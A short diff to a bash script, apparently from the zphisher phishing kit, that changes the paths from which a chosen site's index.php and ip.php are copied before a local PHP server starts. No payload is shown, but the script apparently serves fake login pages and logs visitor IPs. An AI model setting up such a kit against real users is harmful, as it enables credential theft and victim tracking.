@@ -348,8 +348,8 @@ PORT='8080'
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-	cp -rf .sites/"$website"/index.php .server/www
-	cp -f .sites/ip.php .server/www/
+	cp -rf zphisher/.sites/"$website"/index.php .server/www
+	cp -f zphisher/.sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
